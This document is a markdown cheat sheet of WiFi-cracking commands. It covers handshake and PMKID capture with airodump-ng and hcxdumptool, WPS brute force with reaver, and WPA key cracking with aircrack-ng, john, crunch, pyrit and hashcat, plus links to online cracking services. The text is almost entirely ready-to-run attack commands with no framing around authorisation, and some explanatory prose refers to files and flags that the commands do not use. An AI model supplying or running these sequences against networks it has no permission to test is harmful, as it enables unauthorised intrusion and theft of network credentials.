# Wifi Crack

## Aircrack: (Hash)

	aircrack-ng -w password.lst -b 00:14:6C:7E:40:80 psk\*.cap

## Reaver: (PSK)

	reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv
	reaver -i wlan0mon <replace with yours> -b <bssid> -c <channel no> -K 1 -vv

## Crunch & Aircrack:

	crunch 8 8 0123456789 -s 00000000 -e 99999999 | aircrack -e test proof.cap -w -

Use john to keep a session of aircrack when used with huge wordlist:

	crunch 8 8 | john --stdin --wordlist=password.lst --stdout --session=sessname | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -


## John & Aircrack:

	john --wordlist=password.lst --rules=Jumbo --stdout | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -

Use john to keep a session of aircrack when used with huge wordlist:

	john --wordlist=password.lst --rules=Jumbo --stdout --session=sessname | aircrack-ng -b C0:25:E9:62:CE:E5 psk-01.cap -w -

https://wpa-sec.stanev.org/
https://github.com/danielmiessler/SecLists

## Pyrit:

Pyrit is one of the fastest tools available for WPA password-cracking out there.

One helpful tool is the strip command, which strips down long capture files to only include relevant packets. And then there's the verify option that lets Pyrit confirm results via recomputation.

Pyrit also has several features to import multiple password lists into a large database. To prevent duplicates, the import_unique_passwords command can also strip out passwords that appear multiple times in the same file we're trying to import. After we import passwords to the database, we can start cracking them with the attack_batch option.

Download a Password List & Benchmark System:

	wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt

	pyrit benchmark (benchmark our system)

	pyrit -i '/root/Desktop/probable-v2-wpa-top4800.txt' import_passwords (import passwords to the database)

Capture handshakes:

	airmon-ng start wlan0
	airodump-ng wlan0mon -c 3 -w capture
	pyrit -r '/root/Desktop/capture-01.cap' analyze (analyse captured file to show if we have a valid handshake)

Final command:

	pyrit -r capture.pcap -o savedpass attack_batch

## Hxctools & Hashcat

In this case we use Hxctools & Hashcat to capture packets and crack the password but we can do that automaticaly with wifite, if the necessary softwares are installed Wifite will automaticaly use them and give us a URL to upload the modified handshakes. Then the password cracking is performed from connected server online using different password lists.

Install Hxctools & Hashcat:

	sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev

MacOs Install:

	brew install hashcat hxctools
	
On your Git folder:

	git clone https://github.com/ZerBea/hcxdumptool.git
	cd hcxdumptool
	sudo make
	sudo make install

On your Git folder:

	git clone https://github.com/ZerBea/hcxtools.git
	cd hcxtools
	sudo make
	sudo make install

	apt install hashcat

Use Hxcdump to Capture PMKIDs from Local Networks

	airmon-ng start wlan0
	
	hcxdumptool -i wlan0mon -o capture.pcapng --enable__status=1

-i tells the program which interface we are using, in this case, wlan0mon. The filename we'll be saving the results to can be specified with the -o flag argument. The channel we want to scan on can be indicated with the -c flag followed by the number of the channel to scan.

Use Hxcpcaptool to Convert the Dump for Hashcat:

To convert our PCAPNG file, we'll use hcxpcaptool with a few arguments specified. In the same folder that your .PCAPNG file is saved, run the following command in a terminal window.

	hcxpcaptool -z hash capture.pcapng

	hcxpcaptool -E essidlist -I identitylist -U usernamelist -z hash capture.pcapng

This command is telling hxcpcaptool to use the information included in the file to help Hashcat understand it with the -E, -I, and -U flags. The -Z flag is used for the name of the newly converted file for Hashcat to use, and the last part of the command is the PCAPNG file we want to convert.

Select a Password List & Brute Force with Hashcat:

	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt -w 4 -a 0

	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt > out.txt

	hashcat -m 16800 --force hash /home/user/Downloads/rockyou.txt.txt --show

 New:

 	hashcat -m 22000 -a 3 --session session_name /Users/nicolasgrimonpont/Hash '?1?1?1?1?1?1?1?1' -1 '?l?u?d'

  This is a mask attack:
  - m 22000 (new WPA algo)
  - '?1?1?1?1?1?1?1?1' (mask lenght)
  - -1 '?l?u?d' (custom rule 1) uppercase, lowercase, digit

  - '?2?2?2?2?2?2?2?2' (mask lenght)
  - -2 '?l?u?d' (custom rule 2) uppercase, lowercase, digit

	
In this command, we are starting Hashcat in 16800 mode, which is for attacking WPA-PMKID-PBKDF2 network protocols. Next, we'll specify the name of the file we want to crack, in this case, "HC.16800." The -a flag tells us which types of attack to use, in this case, a "straight" attack, and then the -w and --kernel-accel=1 flags specifies the highest performance workload profile. If your computer suffers performance issues, you can lower the number in the -w argument.

Next, the --force option ignores any warnings to proceed with the attack, and the last part of the command specifies the password list we're using to try to brute force the PMKIDs in our file, in this case, called "topwifipass.txt."

Online cracking:

	https://gpuhash.me/
